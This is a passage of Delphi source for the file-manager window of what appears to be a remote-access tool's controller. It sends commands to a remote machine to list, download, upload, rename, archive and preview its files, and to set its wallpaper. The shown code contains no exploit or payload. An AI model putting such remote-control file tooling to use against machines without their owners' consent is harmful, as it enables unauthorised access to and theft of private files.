begin
  ComboBox1.Text := DirList.Strings[DirListPosition - 1];
  if posex('\', ComboBox1.Text) > 2 then IniciarListagem(ComboBox1.Text);
  DirList.Delete(DirListPosition);


  dec(DirListPosition, 2);
  BitBtnback.Enabled := DirListPosition > 0;
  BitBtnForward.Enabled := DirListPosition < DirList.Count - 1;
  BitBtnUp.Enabled := StringCount(ComboBox1.Text, '\') >= 2;
end;

procedure TFormFileManager.BitBtnForwardClick(Sender: TObject);
begin
  ComboBox1.Text := DirList.Strings[DirListPosition + 1];
  if posex('\', ComboBox1.Text) > 2 then IniciarListagem(ComboBox1.Text);
  DirList.Delete(DirListPosition);


  BitBtnback.Enabled := DirListPosition > 0;
  BitBtnForward.Enabled := DirListPosition < DirList.Count - 1;
  BitBtnUp.Enabled := StringCount(ComboBox1.Text, '\') >= 2;
end;

procedure TFormFileManager.BitBtnUpClick(Sender: TObject);
var
  TempStr: string;
begin
  TempStr := ComboBox1.Text;
  if TempStr[length(TempStr)] = '\' then delete(TempStr, length(TempStr), 1);
  TempStr := Copy(TempStr, 1, LastDelimiter('\', TempStr));
  if posex('\', TempStr) < 3 then Exit;

  ComboBox1.Text := TempStr;
  IniciarListagem(ComboBox1.Text);
end;

procedure TFormFileManager.FormCreate(Sender: TObject);
var
  SHFileInfo :TSHFileINfo;
  Bitmap: TBitmap;
  Icon: TIcon;
  D: Dword;
  i: integer;
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;

  FormFMPreview := TFormFMPreview.create(application);
  WM_GETIMAGE := RegisterWindowMessageW(pChar(UnitMain.RandomString(High(MaxN))));

  FirstTime := True;
  ComboBox1.Items.Clear;
  if ListView1.Items.Count > 0 then ListView1.items.Clear; // tentar acabar com o problema de ---> Stream Error: Items.ItemData = {}
  if ListView2.Items.Count > 0 then ListView2.items.Clear; // tentar acabar com o problema de ---> Stream Error: Items.ItemData = {}

  ThumbQuality := 50;

  SharedDrive := nil;
  SpecialNode := nil;

  ComboBox1.Items.Clear;

  DirList := TStringList.Create;
  DirListPosition := -1;
  BitBtnBack.Enabled := False;
  BitBtnForward.Enabled := False;
  BitBtnUp.Enabled := False;

  PageControl1.DoubleBuffered := true;
  TreeView1.DoubleBuffered := true;
  ListView1.DoubleBuffered := true;
  ListView2.DoubleBuffered := true;
  IncompletosCarregados := False;

  FormMain.ImageListDiversos.GetBitmap(10, BitBtnBack.Glyph);
  FormMain.ImageListDiversos.GetBitmap(9, BitBtnUp.Glyph);
  FormMain.ImageListDiversos.GetBitmap(11, BitBtnForward.Glyph);

  ImageListTreeView.Handle := FormMain.SuperImageList.Handle;
  ImageListListView.Handle := FormMain.SuperImageList.Handle;
  ImageListListView2.Handle := FormMain.SuperImageList.Handle;

  TreeView1.Items.Item[0].ImageIndex := FormMain.FileManagerIcon[6];
  TreeView1.Items.Item[0].SelectedIndex := FormMain.FileManagerIcon[6];
  FolderIcon := FormMain.FileManagerIcon[4];
  FolderIconSelected := FormMain.FileManagerIcon[5];
  FolderIconListView := FormMain.FileManagerFolderIcon;

  Application.CreateForm(TFormDownloadAll, FormDownloadAll);
  SendMessage(FormDownloadAll.Handle, 5555, cardinal(Servidor), 0);
  SendMessage(FormDownloadAll.Handle, 5559, cardinal(Self), 0);

  Rar1.Visible := False;
  UnRar1.Visible := False;
end;

procedure TFormFileManager.FormDestroy(Sender: TObject);
begin
  if Assigned(FormDownloadAll) and (FormDownloadAll.Visible) then
  begin
    FormDownloadAll.Close;
    FormDownloadAll.Free;
  end;
  FormDownloadAll := nil;
end;

procedure TFormFileManager.EnviarListarDir(node: TTreeNode);
var
  TempStr: string;
begin
  SelectedNode[NodeAtual] := node;
  TempStr := GetFullPath(node);
  LastUploadFolder := TempStr;
  while posex('\\', LastUploadFolder) > 0 do delete(LastUploadFolder, posex('\\', LastUploadFolder), 1);

  Servidor.EnviarString(FMFOLDERLIST + '|' + IntToStr(NodeAtual) + '|' + TempStr + '|');
  Statusbar1.Panels.Items[0].Text:= traduzidos[205];
  if ComboBox1.Items.IndexOf(TempStr) < 0 then ComboBox1.Items.Add(TempStr);
  LastComBoxText := TempStr;
  ComboBox1.Text := LastComBoxText;
  inc(DirListPosition);
  DirList.Insert(DirListPosition, LastComBoxText);

  BitBtnback.Enabled := DirListPosition > 0;
  BitBtnForward.Enabled := DirListPosition < DirList.Count - 1;
  BitBtnUp.Enabled := StringCount(ComboBox1.Text, '\') >= 2;

  inc(NodeAtual);
end;

function TFormFileManager.GetFileTypeDescription(Ext: String): String;
var
  hFile: THandle;
  FileInfo: TSHFileInfo;
  TempStr: string;
begin
  Randomize;
  TempStr := MyTempFolder + inttostr(Random(99999)) + ext;
  hFile := CreateFile(PChar(TempStr), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
  CloseHandle(hFile);
  SHGetFileInfo(PChar(TempStr), 0, FileInfo, SizeOf(FileInfo), SHGFI_TYPENAME);
  result := string(FileInfo.szTypeName);
  DeleteFile(TempStr);
end;

procedure TFormFileManager.Iniciar1Click(Sender: TObject);
var
  i: integer;
  TempStr, TempFile: string;
begin
  Prviadasimagens1.Checked := not Prviadasimagens1.Checked;

  if Prviadasimagens1.Checked = false then
  begin
    ListView1.LargeImages := ImageListListView;
    ListView1.SmallImages := ImageListListView;
    Servidor.EnviarString(FMTHUMBS + '|'); // finalizar a thread ativa no Servidor.
    exit;
  end;

  if Prviadasimagens1.Checked = true then
  begin
    for i := 0 to ListView1.Items.Count - 1 do
    if ListView1.Items.Item[i].Selected = true then
    begin
      TempFile :=  TFileDados(ListView1.Items.Item[i].Data).FileName;
      if IsImageFile(TempFile) = true then TempStr := TempStr + TempFile + delimitadorComandos;
    end;
  end;

  if TempStr <> '' then
  begin  // se existirem items selecionados como imagens
    Servidor.EnviarString(FMTHUMBS + '|' + inttostr(ThumbSize) + '|' + inttostr(ThumbQuality) + '|' + TempStr);
    statusbar1.Panels.Items[0].Text := traduzidos[385];
  end else
  begin // se não existirem items selecionados como imagens
    Prviadasimagens1.Checked := false;
    ListView1.LargeImages := ImageListListView;
    ListView1.SmallImages := ImageListListView;

    MessageBox(Handle,
               pwidechar(traduzidos[386]),
               pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
               MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
  end;
end;

procedure TFormFileManager.Iniciar2Click(Sender: TObject);
var
  i: integer;
  TempStr, TempFile: string;
begin
  Prviadasimagens2.Checked := not Prviadasimagens2.Checked;

  if Prviadasimagens2.Checked = false then
  begin
    ListView2.LargeImages := ImageListListView2;
    ListView2.SmallImages := ImageListListView2;
    Servidor.EnviarString(FMTHUMBS_SEARCH + '|'); // finalizar a thread ativa no Servidor.
    exit;
  end;

  if Prviadasimagens2.Checked = true then
  begin
    for i := 0 to ListView2.Items.Count - 1 do
    if ListView2.Items.Item[i].Selected = true then
    begin
      TempFile :=  ListView2.Items.Item[i].Caption;
      if IsImageFile(TempFile) = true then TempStr := TempStr + TempFile + delimitadorComandos;
    end;
  end;

  if TempStr <> '' then
  begin  // se existirem items selecionados como imagens
    Servidor.EnviarString(FMTHUMBS_SEARCH + '|' + inttostr(ThumbSize) + '|' + inttostr(ThumbQuality) + '|' + TempStr);
    statusbar1.Panels.Items[0].Text := traduzidos[385];
  end else
  begin // se não existirem items selecionados como imagens
    Prviadasimagens2.Checked := false;
    ListView2.LargeImages := ImageListListView2;
    ListView2.SmallImages := ImageListListView2;
    MessageBox(Handle,
               pwidechar(traduzidos[386]),
               pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
               MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
  end;
end;

procedure TFormFileManager.Iniciar3Click(Sender: TObject);
var
  i: integer;
  Node: pVirtualNode;
  TransferInfo: pConexaoNew;
begin
  if VirtualStringTree1.SelectedCount > 0 then
  begin
    Node := VirtualStringTree1.GetFirstSelected;
    while Assigned(Node) do
    begin
      IniciarTransferencia(Node);
      Node := VirtualStringTree1.GetNextSelected(Node);
    end;
  end;
  VirtualStringTree1.Refresh;
end;

procedure TFormFileManager.ExcluirTransferencia(selectedonly: boolean = true);
var
  i: integer;
  Node: pVirtualNode;
  Transfer: TConexaoNew;
begin
  if VirtualStringTree1.SelectedCount > 0 then
  begin
    if selectedonly then Node := VirtualStringTree1.GetFirstSelected else
    Node := VirtualStringTree1.GetFirst;

    while Assigned(Node) do
    begin
      Transfer := TConexaoNew(pConexaoNew(VirtualStringTree1.GetNodeData(Node))^.AContext);
      if Transfer.MasterIdentification = 1234567890 then
      try
        Transfer.Connection.Disconnect;
	    except
      end;

      if selectedonly then Node := VirtualStringTree1.GetNextSelected(Node) else
      Node := VirtualStringTree1.GetNext(Node);
    end;
  end;
  if selectedonly then VirtualStringTree1.DeleteSelectedNodes else
  begin
    VirtualStringTree1.SelectAll(False);
    VirtualStringTree1.DeleteSelectedNodes;
  end;

  VirtualStringTree1.Refresh;
end;

procedure TFormFileManager.LoadIncompletes;
var
  SR: TSearchRec;
  MS: TMemoryStream;
  FileName, TempStr: string;
  Transfer: TConexaoNew;
  Node: pVirtualNode;
  Path: string;
begin
  Path := ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC + '\';

  if FindFirst(Path + '*.xtreme', faAnyFile, SR) = 0 then
  begin
    repeat
      if (SR.Attr <> faDirectory) then
      begin
        if posex('.', SR.Name) > 0 then
        begin
          FileName := SR.Name;
          if FileExists(Path + Copy(FileName, 1, LastDelimiter('.', FileName) - 1)) then
          begin
          try
            MS := TMemoryStream.Create;
            MS.LoadFromFile(Path + FileName);
            SetLength(TempStr, MS.Size div 2);
            MS.Position := 0;
            MS.Read(TempStr[1], MS.Size);
          finally
           MS.Free;
          end;


            if TempStr = '' then
            begin
              deletefile(Path + FileName);
              Continue;
            end;
            Transfer := TConexaoNew.Create(nil, nil);

            Transfer.CreateTransfer('', '', 0, 0, True, VirtualStringTree1);
            Transfer.Transfer_Status := Traduzidos[129];

            Transfer.Transfer_RemoteFileName := Copy(TempStr, 1, posex('|', TempStr) - 1);
            delete(TempStr, 1, posex('|', TempStr));

            Transfer.Transfer_RemoteFileSize := StrToInt(Copy(TempStr, 1, posex('|', TempStr) - 1));
            delete(TempStr, 1, posex('|', TempStr));
            Transfer.Transfer_RemoteFileSize_string := FileSizeToStr(Transfer.Transfer_RemoteFileSize);

            Transfer.Transfer_LocalFileName := Copy(TempStr, 1, posex('|', TempStr) - 1);
            delete(TempStr, 1, posex('|', TempStr));

            Transfer.Transfer_LocalFileSize := StrToInt(Copy(TempStr, 1, posex('|', TempStr) - 1));
            delete(TempStr, 1, posex('|', TempStr));
            Transfer.Transfer_LocalFileSize_string := FileSizeToStr(Transfer.Transfer_LocalFileSize);

            Transfer.Transfer_TransferPosition := Transfer.Transfer_LocalFileSize;

            Transfer.Transfer_TransferPosition_string :=
              IntToStr(round((Transfer.Transfer_LocalFileSize / Transfer.Transfer_RemoteFileSize) * 100)) + '%';

            Transfer.Transfer_IsDownload := True;

          end else DeleteFile(Path + FileName);
        end;
      end;
    until FindNext(SR) <> 0;
    FindClose(SR);
  end;
end;

procedure TFormFileManager.PararTransferencia(Node: pVirtualNode);
var
  Transfer: TConexaoNew;
begin
  if Assigned(Node) then
  begin
    Transfer := TConexaoNew(pConexaoNew(VirtualStringTree1.GetNodeData(Node))^.AContext);

    if Transfer.MasterIdentification = 1234567890 then
    try
      Transfer.Connection.Disconnect;
	  except
    end;
  end;

  VirtualStringTree1.Refresh;
end;

procedure TFormFileManager.PopupMenuListView2Popup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to PopupMenuListView2.Items.Count - 1 do PopupMenuListView2.Items.Items[i].Enabled := false;
  Abrirpastadedownloads2.Enabled := True;

  if ListView2.Selected = nil then exit;

  for i := 0 to PopupMenuListView2.Items.Count - 1 do PopupMenuListView2.Items.Items[i].Enabled := true;
  if ListView2.SelCount > 1 then
  begin
    Executar3.Enabled := false;
    Editar2.Enabled := false;
    Definircomopapeldeparede2.Enabled := false;
  end else
  begin // apenas um selecionado
    if IsImageFile(ListView2.Selected.Caption) = false then
    begin
      Definircomopapeldeparede2.Enabled := false;
      Prviadasimagens2.Enabled := false;
    end else
    begin
      Definircomopapeldeparede2.Enabled := true;
      Prviadasimagens2.Enabled := true;
    end;
  end;
end;

procedure TFormFileManager.PopupMenuListViewPopup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to PopupMenuListView.Items.Count - 1 do PopupMenuListView.Items.Items[i].Enabled := false;
  Abrirpastadedownloads1.Enabled := True;

  if ListView1.Selected = nil then
  begin
    if TreeView1.Selected = nil then exit;
    if LastUploadFolder <> '' then Upload1.Enabled := true;
    exit;
  end;

  if ListView1.SelCount = 1 then
  begin
    CtrlC1.Enabled := True;
    CtrlV1.Enabled := ToCopy <> '';

    if (ListView1.Selected.SubItems.Objects[0] = nil) and (ListView1.Selected.SubItems.strings[0] = '') then
    begin
      LastUploadFolder := TDirDados(ListView1.Selected.Data).Info + '\';
      while posex('\\', LastUploadFolder) > 0 do delete(LastUploadFolder, posex('\\', LastUploadFolder), 1);
      Deletar2.Enabled := True;
      Moverparalixeira2.Enabled := True;
      Editar1.Enabled := True;
      Upload1.Enabled := true;
      DownloadFolder1.Enabled := True;
      UnRar1.Enabled := False;
      Rar1.Enabled := True;

      exit;
    end;
  end;

  for i := 0 to PopupMenuListView.Items.Count - 1 do PopupMenuListView.Items.Items[i].Enabled := true;
  DownloadFolder1.Enabled := False;

  if ListView1.SelCount > 1 then
  begin
    CtrlC1.Enabled := False;
    CtrlV1.Enabled := ToCopy <> '';

    Executar1.Enabled := false;
    Editar1.Enabled := false;
    UploadFTP1.Enabled := False;
    Definircomopapeldeparede1.Enabled := false;
    UnRar1.Enabled := False;
    Rar1.Enabled := True;
  end else
  begin // apenas um selecionado
    LastUploadFolder := ExtractFileDir(TFileDados(ListView1.Selected.Data).FileName) + '\';
    while posex('\\', LastUploadFolder) > 0 do delete(LastUploadFolder, posex('\\', LastUploadFolder), 1);
    if IsImageFile(TFileDados(ListView1.Selected.Data).FileName) = false then
    begin
      Definircomopapeldeparede1.Enabled := false;
      Prviadasimagens1.Enabled := false;
    end else
    begin
      Definircomopapeldeparede1.Enabled := true;
      Prviadasimagens1.Enabled := true;
    end;
    UploadFTP1.Enabled := True;

    if (LowerCase(ExtractFileExt(TFileDados(ListView1.Selected.Data).FileName)) = '.rar') or
       (LowerCase(ExtractFileExt(TFileDados(ListView1.Selected.Data).FileName)) = '.zip') then
    begin
      UnRar1.Enabled := True;
      Rar1.Enabled := False;
    end else
    begin
      UnRar1.Enabled := False;
      Rar1.Enabled := True;
    end;

  end;
  CtrlV1.Enabled := ToCopy <> '';
end;

procedure TFormFileManager.PopupMenuTransfersPopup(Sender: TObject);
var
  Transfer: TConexaoNew;
begin
  Iniciar3.Enabled := True;
  Parar1.Enabled := True;
  Excluir1.Enabled := True;

  if VirtualStringTree1.SelectedCount <= 0 then
  begin
    Iniciar3.Enabled := false;
    Parar1.Enabled := false;
    Excluir1.Enabled := false;
    exit;
  end;

  if VirtualStringTree1.SelectedCount > 1 then
  begin
    Iniciar3.Enabled := True;
    Parar1.Enabled := True;
    Excluir1.Enabled := True;
    exit;
  end;

  Transfer := TConexaoNew(pConexaoNew(VirtualStringTree1.GetNodeData(VirtualStringTree1.GetFirstSelected))^);

  if Transfer.Transfer_TransferComplete = True then
  begin
    Iniciar3.Enabled := false;
    Parar1.Enabled := false;
    exit;
  end;

  if Transfer.AContext.MasterIdentification <> 1234567890 then // Nâo existe conexão
  begin
    Iniciar3.Enabled := True;
    Parar1.Enabled := false;
    exit;
  end;

  if Transfer.Transfer_TransferComplete = False then
  begin
    Iniciar3.Enabled := false;
    Parar1.Enabled := True;
    exit;
  end;

  if Transfer.Transfer_IsDownload = False then
  begin
    Iniciar3.Enabled := false;
    Parar1.Enabled := false;
    exit;
  end;
end;

procedure TFormFileManager.PopupMenuTreeViewPopup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to PopupMenuTreeView.Items.Count - 1 do PopupMenuTreeView.Items.Items[i].Enabled := false;
  Atualizarautomaticamente1.Enabled := TreeView1.Enabled;
  if (TreeView1.Selected = nil) or
     (TreeView1.Items.Item[0].Selected = true) or
     ((SharedDrive <> nil) and (SharedDrive.Selected = true)) or
     ((SpecialNode <> nil) and (SpecialNode.Selected = true)) then exit;
  if (TreeView1.Selected.Parent = TreeView1.Items.Item[0]) or
     ((SharedDrive <> nil) and (TreeView1.Selected.Parent = SharedDrive)) or
     ((SpecialNode <> nil) and (TreeView1.Selected.Parent = SpecialNode)) then
  begin
    Novapasta1.Enabled := true;
    exit;
  end;
  for i := 0 to PopupMenuTreeView.Items.Count - 1 do PopupMenuTreeView.Items.Items[i].Enabled := true;
end;

procedure TFormFileManager.RAR1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  FileName: string;
  Dir: string;
begin
  FileName := 'FileName';
  if InputQuery(Traduzidos[638], Traduzidos[379] + ':', FileName) = False then exit;

  if (ListView1.Selected.SubItems.Objects[0] = nil) and (ListView1.Selected.SubItems.strings[0] = '') then
  begin
    Dir := TDirDados(ListView1.Selected.Data).Info + '\';
    Dir := Copy(Dir, 1, LastDelimiter('\', Dir));
    while posex('\\', Dir) > 0 do delete(Dir, posex('\\', Dir), 1);
    Dir := Copy(Dir, 1, LastDelimiter('\', Dir) - 1);
    Dir := Copy(Dir, 1, LastDelimiter('\', Dir));
  end else
  begin
    Dir := ExtractFileDir(TFileDados(ListView1.Selected.Data).FileName) + '\';
    while posex('\\', Dir) > 0 do delete(Dir, posex('\\', Dir), 1);
  end;
  FileName := Dir + FileName;

  for i := 0 to ListView1.Items.Count - 1 do
  if ListView1.Items.Item[i].Selected = true then
  TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + '|';
  Servidor.EnviarString(FMRARFILE + '|' + FileName + '|' + TempStr);
end;

procedure TFormFileManager.Recursive1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  RemoteFileName: string;
  Transfer: TConexaoNew;
begin
  TempStr := '';

  for i := 0 to ListView1.Items.Count - 1 do
  if (ListView1.Items.Item[i].Selected = true) and
     (ListView1.Items.Item[i].SubItems.Objects[0] <> nil) and
     (ListView1.Items.Item[i].SubItems.strings[0] <> '') then
  begin
    if Int64(ListView1.Items.Item[i].SubItems.Objects[0]) <= 0 then Continue;
    if CheckDownloadList(TFileDados(ListView1.Items.Item[i].Data).FileName) = false then
    TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + delimitadorcomandos;
  end;

  if TempStr = '' then Exit;

  PossoBaixarPasta := True;
  ListaArquivosPasta := ListaArquivosPasta + TempStr;

  RemoteFileName := Copy(ListaArquivosPasta, 1, posex(delimitadorcomandos, ListaArquivosPasta) - 1);
  delete(ListaArquivosPasta, 1, posex(delimitadorcomandos, ListaArquivosPasta) - 1);
  delete(ListaArquivosPasta, 1, length(delimitadorcomandos));

  Transfer := TConexaoNew.Create(nil, nil);
  Transfer.CreateTransfer(RemoteFileName, '', 0, 0, True, VirtualStringTree1);

  Servidor.EnviarString(FMDOWNLOADFOLDERADD + '|' + RemoteFileName);

  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.IniciarDownloadAll(h: THandle);
var
  i: integer;
  TempStr: string;
  RemoteFileName: string;
  Transfer: TConexaoNew;
begin
  if FormDownloadAll = nil then Exit;
  if FormDownloadAll.Visible = False then Exit;
  if FormDownloadAll.Handle <> h then exit;

  TempStr := '';

  for i := 0 to FormDownloadAll.ListView2.Items.Count - 1 do
  if FormDownloadAll.ListView2.Items.Item[i].Checked = true then
  begin
    if CheckDownloadList(FormDownloadAll.ListView2.Items.Item[i].Caption) = false then
    TempStr := TempStr + FormDownloadAll.ListView2.Items.Item[i].Caption + delimitadorcomandos;
  end;

  if TempStr = '' then Exit;

  PossoBaixarPasta := True;
  ListaArquivosPasta := ListaArquivosPasta + TempStr;

  RemoteFileName := Copy(ListaArquivosPasta, 1, posex(delimitadorcomandos, ListaArquivosPasta) - 1);
  delete(ListaArquivosPasta, 1, posex(delimitadorcomandos, ListaArquivosPasta) - 1);
  delete(ListaArquivosPasta, 1, length(delimitadorcomandos));

  Transfer := TConexaoNew.Create(nil, nil);
  Transfer.CreateTransfer(RemoteFileName, '', 0, 0, True, VirtualStringTree1);

  Servidor.EnviarString(FMDOWNLOADFOLDERADD + '|' + RemoteFileName);

  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.Recursive2Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  RemoteFileName: string;
  Transfer: TConexaoNew;
begin
  TempStr := '';

  for i := 0 to ListView2.Items.Count - 1 do
  if ListView2.Items.Item[i].Selected = true then
  begin
    if CheckDownloadList(ListView2.Items.Item[i].Caption) = false then
    TempStr := TempStr + ListView2.Items.Item[i].Caption + delimitadorcomandos;
  end;

  if TempStr = '' then Exit;

  PossoBaixarPasta := True;
  ListaArquivosPasta := ListaArquivosPasta + TempStr;

  RemoteFileName := Copy(ListaArquivosPasta, 1, posex(delimitadorcomandos, ListaArquivosPasta) - 1);
  delete(ListaArquivosPasta, 1, posex(delimitadorcomandos, ListaArquivosPasta) - 1);
  delete(ListaArquivosPasta, 1, length(delimitadorcomandos));

  Transfer := TConexaoNew.Create(nil, nil);
  Transfer.CreateTransfer(RemoteFileName, '', 0, 0, True, VirtualStringTree1);

  Servidor.EnviarString(FMDOWNLOADFOLDERADD + '|' + RemoteFileName);

  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.Renomear1Click(Sender: TObject);
var
  New, Old: string;
begin
  New := TreeView1.Selected.Text;
  Old := TreeView1.Selected.Text;
  if InputQuery(traduzidos[378], traduzidos[379] + ':', New) = true then
  begin
    SelectedNode[NodeAtual] := Treeview1.Selected;
    Servidor.EnviarString(FMRENOMEARPASTA + '|' + IntToStr(NodeAtual) + '|' +
                 GetFullPath(TreeView1.Selected.Parent) + old + '\' + delimitadorComandos +
                 GetFullPath(TreeView1.Selected.Parent) + new + '\' + delimitadorComandos);
    statusbar1.Panels.Items[0].Text := traduzidos[205];
    inc(NodeAtual);
  end;
end;

procedure TFormFileManager.IniciarListagem(DirName: string);
var
  TempStr: String;
begin
  TempStr := DirName;
  if TempStr = '' then exit;
  //ListView1.Items.Clear;
  if TempStr[length(tempstr)] <> '\' then TempStr := TempStr + '\';
  ComboBox1.Text := TempStr;

  Edit2.Text := ComboBox1.Text;

  Servidor.EnviarString(FMFOLDERLIST2 + '|' + ComboBox1.Text);
  statusbar1.Panels.Items[0].Text := traduzidos[205];
  if ComboBox1.Items.IndexOf(ComboBox1.Text) < 0 then ComboBox1.Items.Add(ComboBox1.Text);
  LastComBoxText := ComboBox1.Text;
  inc(DirListPosition);
  DirList.Insert(DirListPosition, LastComBoxText);

  BitBtnback.Enabled := DirListPosition > 0;
  BitBtnForward.Enabled := DirListPosition < DirList.Count - 1;
  BitBtnUp.Enabled := StringCount(ComboBox1.Text, '\') >= 2;
end;

procedure TFormFileManager.IniciarTransferencia(Node: pVirtualNode);
var
  Transfer: TConexaoNew;
begin
  if Node <> nil then
  begin
    Transfer := TConexaoNew(pConexaoNew(VirtualStringTree1.GetNodeData(Node))^);
    if Transfer.AContext.MasterIdentification <> 1234567890 then // não existe conexão ativa

    if (Transfer.Transfer_TransferComplete = False) and (Transfer.Transfer_IsDownload = True) then
    begin
      Servidor.EnviarString(FMRESUMEDOWNLOAD + '|' +
                                      Transfer.Transfer_RemoteFileName + DelimitadorComandos +
                                      IntToStr(Transfer.Transfer_TransferPosition));
      sleep(50);
      Application.ProcessMessages;
    end;
  end;
end;

function TFormFileManager.CheckDownloadList(FileName: string): boolean;
var
  i: integer;
  Transfer: pConexaoNew;
  Node: pVirtualNode;
begin
  result := False;
  if VirtualStringTree1.TotalCount <= 0 then Exit;

  Node := VirtualStringTree1.GetFirst;
  while Assigned(Node) do
  begin
    Transfer := VirtualStringTree1.GetNodeData(Node);
    if Transfer <> nil then
    begin
      if Transfer^.Transfer_RemoteFileName = FileName then
      begin
        result := true;
        MessageBox(Handle,
                   pwidechar(traduzidos[389] + ' ' + ExtractFileName(FileName) + ' ' + traduzidos[390]),
                   pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                   MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
        Break;
      end;
    end;
    Node := VirtualStringTree1.GetNext(Node);
  end;
end;

constructor TFormFileManager.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  i: integer;
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);

  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('FileManager', 'Width', Width);
    Height := IniFile.ReadInteger('FileManager', 'Height', Height);
    Left := IniFile.ReadInteger('FileManager', 'Left', Left);
    Top := IniFile.ReadInteger('FileManager', 'Top', Top);
    TreeView1.Width := IniFile.ReadInteger('FileManager', 'TV', TreeView1.Width);
    if TreeView1.Width < 150 then TreeView1.Width := 150;

    LastFTPAddress := UTF8ToAnsi(IniFile.ReadString('FileManager', 'FTPAddress', 'ftp.ftpserver.com'));
    LastFTPFolder := UTF8ToAnsi(IniFile.ReadString('FileManager', 'FTPFolder', ''));
    LastFTPUser := UTF8ToAnsi(IniFile.ReadString('FileManager', 'FTPUser', 'ftpuser'));
    LastFTPPass := UTF8ToAnsi(IniFile.ReadString('FileManager', 'FTPPass', 'ftppass'));;

    ListView1.Column[0].Width := IniFile.ReadInteger('FileManager', 'LV1_0', ListView1.Column[0].Width);
    ListView1.Column[1].Width := IniFile.ReadInteger('FileManager', 'LV1_1', ListView1.Column[1].Width);
    ListView1.Column[2].Width := IniFile.ReadInteger('FileManager', 'LV1_2', ListView1.Column[2].Width);
    ListView1.Column[3].Width := IniFile.ReadInteger('FileManager', 'LV1_3', ListView1.Column[3].Width);
    ListView1.Column[4].Width := IniFile.ReadInteger('FileManager', 'LV1_4', ListView1.Column[4].Width);

    Panel2.Width := IniFile.ReadInteger('FileManager', 'WP1', Panel2.Width);
    if Panel2.Width < 180 then Panel2.Width := 180;

    ListView2.Column[0].Width := IniFile.ReadInteger('FileManager', 'LV2_0', ListView2.Column[0].Width);
    ListView2.Column[1].Width := IniFile.ReadInteger('FileManager', 'LV2_1', ListView2.Column[1].Width);
    ListView2.Column[2].Width := IniFile.ReadInteger('FileManager', 'LV2_2', ListView2.Column[2].Width);
    ListView2.Column[3].Width := IniFile.ReadInteger('FileManager', 'LV2_3', ListView2.Column[3].Width);
    ListView2.Column[4].Width := IniFile.ReadInteger('FileManager', 'LV2_4', ListView2.Column[4].Width);

    VirtualStringTree1.Header.Columns.Items[0].Width := IniFile.ReadInteger('FileManager', 'LV3_0', VirtualStringTree1.Header.Columns.Items[0].Width);
    VirtualStringTree1.Header.Columns.Items[1].Width := IniFile.ReadInteger('FileManager', 'LV3_1', VirtualStringTree1.Header.Columns.Items[1].Width);
    VirtualStringTree1.Header.Columns.Items[2].Width := IniFile.ReadInteger('FileManager', 'LV3_2', VirtualStringTree1.Header.Columns.Items[2].Width);
    VirtualStringTree1.Header.Columns.Items[3].Width := IniFile.ReadInteger('FileManager', 'LV3_3', VirtualStringTree1.Header.Columns.Items[3].Width);
    VirtualStringTree1.Header.Columns.Items[4].Width := IniFile.ReadInteger('FileManager', 'LV3_4', VirtualStringTree1.Header.Columns.Items[4].Width);
    VirtualStringTree1.Header.Columns.Items[5].Width := IniFile.ReadInteger('FileManager', 'LV3_4', VirtualStringTree1.Header.Columns.Items[5].Width);

    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormFileManager.CtrlC1Click(Sender: TObject);
begin
  if ListView1.SelCount <> 1 then Exit;

  if (ListView1.Selected.SubItems.Objects[0] = nil) and (ListView1.Selected.SubItems.strings[0] = '') then
  begin
    ToCopy := FMCOPYFOLDER + '|' + LastUploadFolder + DelimitadorComandos;
  end else
  begin
    ToCopy := FMCOPYFILE + '|' + TFileDados(ListView1.Selected.Data).FileName + DelimitadorComandos;
  end;
  //MessageBox(Handle, pchar(ToCopy), Pchar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_OK or MB_ICONINFORMATION);
end;

procedure TFormFileManager.CtrlV1Click(Sender: TObject);
var
  TempFolder: string;
begin
  TempFolder := LastUploadFolder;
  if MessageBox(Handle,
                pwidechar(Traduzidos[391] + ': ' + TempFolder + #13#10 + traduzidos[135] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;
  Servidor.EnviarString(ToCopy + TempFolder);
end;

procedure TFormFileManager.ComboBox1Change(Sender: TObject);
begin
  BitBtnUp.Enabled := StringCount(ComboBox1.Text, '\') >= 2;
end;

procedure TFormFileManager.ComboBox1CloseUp(Sender: TObject);
begin
  if ComboBox1.ItemIndex >= 0 then
  begin
    ComboBox1.Text := ComboBox1.Items.Strings[ComboBox1.ItemIndex];
    if ComboBox1.Text = LastComBoxText then Exit;
    IniciarListagem(ComboBox1.Text);
    LastComBoxText := ComboBox1.Text;
    inc(DirListPosition);
